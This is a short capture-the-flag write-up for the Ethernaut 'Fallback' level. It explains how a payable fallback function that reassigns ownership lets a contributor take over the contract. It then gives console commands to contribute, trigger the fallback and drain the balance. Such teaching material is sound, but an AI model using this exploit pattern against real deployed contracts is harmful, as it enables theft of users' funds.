---
layout: writeup
title: "Fallback"
level: "Beginner"
category: "Ethernaut"
description: "Understand how fallback functions and payable mechanics can be exploited to hijack contract ownership."
---

## Analysis

simpler than it looks — once you realize the fallback function 
is basically an unlocked backdoor, the whole exploit clicks instantly.

The vulnerability exists because the **fallback function** is `payable` 
and contains logic that assigns the `owner` variable to `msg.sender`.

**Key Conditions for Exploitation:**
1. You must have a contribution balance > 0 (via `contribute()`).
2. You must send a transaction with value > 0 directly to the contract address.

## Solution

1. **Contribute:** `await contract.contribute({ value: toWei('0.0001') })`
2. **Trigger Fallback:** `await contract.sendTransaction({ to: contract.address, value: toWei('0.0001') })`
3. **Drain:** `await contract.withdraw()`